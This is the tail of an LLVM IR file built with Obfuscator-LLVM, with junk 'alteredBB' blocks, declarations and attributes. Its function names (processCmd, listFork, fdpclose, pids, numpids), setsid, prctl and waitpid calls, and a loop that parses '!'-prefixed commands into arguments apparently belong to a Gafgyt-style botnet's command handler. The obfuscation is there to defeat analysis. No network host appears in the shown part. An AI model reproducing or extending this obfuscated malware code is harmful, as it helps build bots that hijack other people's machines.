originalBB57alteredBB:                            ; preds = %originalBB57, %266
  %1141 = getelementptr inbounds [1024 x i8], [1024 x i8]* %23, i32 0, i32 0
  %1142 = load %struct._IO_FILE*, %struct._IO_FILE** %21, align 8
  %1143 = call i8* @fgets(i8* %1141, i32 1024, %struct._IO_FILE* %1142)
  %1144 = getelementptr inbounds [1024 x i8], [1024 x i8]* %23, i32 0, i32 0
  %1145 = getelementptr inbounds [256 x i8], [256 x i8]* %22, i32 0, i32 0
  %1146 = call i32 @strcasecmp(i8* %1144, i8* %1145) #10
  %1147 = icmp ne i32 %1146, 0
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %290
  %1148 = load i32, i32* %25, align 4
  %_62 = sub i32 0, %1148
  %gen63 = add i32 %_62, 1
  %_64 = shl i32 %1148, 1
  %_65 = shl i32 %1148, 1
  %_66 = shl i32 %1148, 1
  %_67 = sub i32 0, %1148
  %gen68 = add i32 %_67, 1
  %1149 = add nsw i32 %1148, 1
  store i32 %1149, i32* %25, align 4
  br label %originalBB61

originalBB72alteredBB:                            ; preds = %originalBB72, %309
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %326
  %1150 = load i32, i32* %25, align 4
  %1151 = icmp eq i32 %1150, 0
  br label %originalBB76

originalBB80alteredBB:                            ; preds = %originalBB80, %352
  %1152 = getelementptr inbounds [256 x i8], [256 x i8]* %22, i32 0, i32 0
  %1153 = load %struct._IO_FILE*, %struct._IO_FILE** %26, align 8
  %1154 = call i32 @fputs(i8* %1152, %struct._IO_FILE* %1153)
  %1155 = load %struct._IO_FILE*, %struct._IO_FILE** %26, align 8
  %1156 = call i32 @fclose(%struct._IO_FILE* %1155)
  br label %originalBB80

originalBB84alteredBB:                            ; preds = %originalBB84, %374
  br label %originalBB84

originalBB88alteredBB:                            ; preds = %originalBB88, %394
  br label %originalBB88

originalBB92alteredBB:                            ; preds = %originalBB92, %411
  %1157 = load %struct._IO_FILE*, %struct._IO_FILE** %21, align 8
  %1158 = call i32 @fclose(%struct._IO_FILE* %1157)
  br label %originalBB92

originalBB96alteredBB:                            ; preds = %originalBB96, %435
  br label %originalBB96

originalBB100alteredBB:                           ; preds = %originalBB100, %459
  %1159 = call i32 @sleep(i32 5)
  br label %originalBB100

originalBB104alteredBB:                           ; preds = %originalBB104, %493
  %1160 = load i32*, i32** @pids, align 8
  %1161 = load i32, i32* %29, align 4
  %1162 = sext i32 %1161 to i64
  %1163 = getelementptr inbounds i32, i32* %1160, i64 %1162
  %1164 = load i32, i32* %1163, align 4
  %1165 = call i32 @waitpid(i32 %1164, i32* null, i32 1)
  %1166 = icmp sgt i32 %1165, 0
  br label %originalBB104

originalBB108alteredBB:                           ; preds = %originalBB108, %520
  %1167 = load i32, i32* %31, align 4
  %1168 = zext i32 %1167 to i64
  %1169 = load i64, i64* @numpids, align 8
  %1170 = icmp ult i64 %1168, %1169
  br label %originalBB108

originalBB112alteredBB:                           ; preds = %originalBB112, %568
  %1171 = load i32, i32* %31, align 4
  %1172 = zext i32 %1171 to i64
  %1173 = load i64, i64* @numpids, align 8
  %1174 = icmp ult i64 %1172, %1173
  br label %originalBB112

originalBB116alteredBB:                           ; preds = %originalBB116, %589
  %1175 = load i32*, i32** @pids, align 8
  %1176 = load i32, i32* %31, align 4
  %1177 = zext i32 %1176 to i64
  %1178 = getelementptr inbounds i32, i32* %1175, i64 %1177
  %1179 = load i32, i32* %1178, align 4
  %1180 = load i32*, i32** %30, align 8
  %1181 = load i32, i32* %31, align 4
  %1182 = zext i32 %1181 to i64
  %1183 = getelementptr inbounds i32, i32* %1180, i64 %1182
  store i32 %1179, i32* %1183, align 4
  br label %originalBB116

originalBB120alteredBB:                           ; preds = %originalBB120, %615
  %1184 = load i32, i32* %31, align 4
  %1185 = add i32 %1184, 1
  store i32 %1185, i32* %31, align 4
  br label %originalBB120

originalBB124alteredBB:                           ; preds = %originalBB124, %634
  %1186 = load i32*, i32** @pids, align 8
  %1187 = bitcast i32* %1186 to i8*
  call void @free(i8* %1187) #2
  %1188 = load i32*, i32** %30, align 8
  store i32* %1188, i32** @pids, align 8
  br label %originalBB124

originalBB128alteredBB:                           ; preds = %originalBB128, %655
  %1189 = load i32, i32* %29, align 4
  %_129 = sub i32 0, %1189
  %gen130 = add i32 %_129, 1
  %_131 = shl i32 %1189, 1
  %_132 = shl i32 %1189, 1
  %_133 = sub i32 %1189, 1
  %gen134 = mul i32 %_133, 1
  %1190 = add nsw i32 %1189, 1
  store i32 %1190, i32* %29, align 4
  br label %originalBB128

originalBB138alteredBB:                           ; preds = %originalBB138, %686
  %1191 = getelementptr inbounds [4096 x i8], [4096 x i8]* %27, i32 0, i32 0
  store i8* %1191, i8** %32, align 8
  %1192 = load i8*, i8** %32, align 8
  %1193 = load i8, i8* %1192, align 1
  %1194 = zext i8 %1193 to i32
  %1195 = icmp eq i32 %1194, 33
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %716
  %1196 = load i8*, i8** %33, align 8
  %1197 = load i8, i8* %1196, align 1
  %1198 = zext i8 %1197 to i32
  %1199 = icmp ne i32 %1198, 0
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %739
  %1200 = load i8*, i8** %33, align 8
  %1201 = getelementptr inbounds i8, i8* %1200, i32 1
  store i8* %1201, i8** %33, align 8
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %758
  %1202 = load i8*, i8** %33, align 8
  %1203 = load i8, i8* %1202, align 1
  %1204 = zext i8 %1203 to i32
  %1205 = icmp eq i32 %1204, 0
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %815
  %1206 = load i8*, i8** %32, align 8
  store i8* %1206, i8** %34, align 8
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %870
  %1207 = call i32 @listFork()
  %1208 = icmp ne i32 %1207, 0
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %909
  %1209 = load i32, i32* %37, align 4
  %1210 = call i32 @fdpclose(i32 %1209)
  call void @exit(i32 0) #14
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %941
  %1211 = load i8*, i8** %40, align 8
  %1212 = call i64 @strlen(i8* %1211) #10
  %_167 = sub i64 %1212, 1
  %gen168 = mul i64 %_167, 1
  %_169 = sub i64 0, %1212
  %gen170 = add i64 %_169, 1
  %_171 = shl i64 %1212, 1
  %_172 = shl i64 %1212, 1
  %_173 = shl i64 %1212, 1
  %_174 = shl i64 %1212, 1
  %_175 = shl i64 %1212, 1
  %1213 = add i64 %1212, 1
  %1214 = call noalias i8* @malloc(i64 %1213) #2
  %1215 = load i32, i32* %39, align 4
  %1216 = sext i32 %1215 to i64
  %1217 = getelementptr inbounds [10 x i8*], [10 x i8*]* %38, i64 0, i64 %1216
  store i8* %1214, i8** %1217, align 8
  %1218 = load i32, i32* %39, align 4
  %1219 = sext i32 %1218 to i64
  %1220 = getelementptr inbounds [10 x i8*], [10 x i8*]* %38, i64 0, i64 %1219
  %1221 = load i8*, i8** %1220, align 8
  %1222 = load i8*, i8** %40, align 8
  %1223 = call i64 @strlen(i8* %1222) #10
  %_176 = sub i64 0, %1223
  %gen177 = add i64 %_176, 1
  %_178 = sub i64 %1223, 1
  %gen179 = mul i64 %_178, 1
  %_180 = sub i64 0, %1223
  %gen181 = add i64 %_180, 1
  %_182 = sub i64 %1223, 1
  %gen183 = mul i64 %_182, 1
  %_184 = sub i64 %1223, 1
  %gen185 = mul i64 %_184, 1
  %_186 = shl i64 %1223, 1
  %_187 = sub i64 %1223, 1
  %gen188 = mul i64 %_187, 1
  %_189 = shl i64 %1223, 1
  %1224 = add i64 %1223, 1
  call void @llvm.memset.p0i8.i64(i8* %1221, i8 0, i64 %1224, i32 1, i1 false)
  %1225 = load i32, i32* %39, align 4
  %1226 = sext i32 %1225 to i64
  %1227 = getelementptr inbounds [10 x i8*], [10 x i8*]* %38, i64 0, i64 %1226
  %1228 = load i8*, i8** %1227, align 8
  %1229 = load i8*, i8** %40, align 8
  %1230 = call i8* @strcpy(i8* %1228, i8* %1229) #2
  %1231 = load i32, i32* %39, align 4
  %1232 = add nsw i32 %1231, 1
  store i32 %1232, i32* %39, align 4
  br label %originalBB166

originalBB193alteredBB:                           ; preds = %originalBB193, %982
  %1233 = load i32, i32* %39, align 4
  %1234 = getelementptr inbounds [10 x i8*], [10 x i8*]* %38, i32 0, i32 0
  call void @processCmd(i32 %1233, i8** %1234)
  %1235 = load i32, i32* %39, align 4
  %1236 = icmp sgt i32 %1235, 1
  br label %originalBB193

originalBB197alteredBB:                           ; preds = %originalBB197, %1008
  %1237 = load i32, i32* %41, align 4
  %1238 = sext i32 %1237 to i64
  %1239 = getelementptr inbounds [10 x i8*], [10 x i8*]* %38, i64 0, i64 %1238
  %1240 = load i8*, i8** %1239, align 8
  call void @free(i8* %1240) #2
  br label %originalBB197

originalBB201alteredBB:                           ; preds = %originalBB201, %1034
  br label %originalBB201
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

declare i32 @prctl(...) #3

declare %struct._IO_FILE* @fopen(i8*, i8*) #3

; Function Attrs: nounwind
declare i8* @getcwd(i8*, i64) #4

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #4

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #3

; Function Attrs: nounwind readonly
declare i32 @strcasecmp(i8*, i8*) #1

declare i32 @fclose(%struct._IO_FILE*) #3

declare i32 @fputs(i8*, %struct._IO_FILE*) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146612692}
!2 = !{i32 -2146611984}
!3 = !{i32 -2146611287}
!4 = !{i32 -2146610396}
!5 = !{i32 -2146609669}
!6 = !{i32 -2146608844}
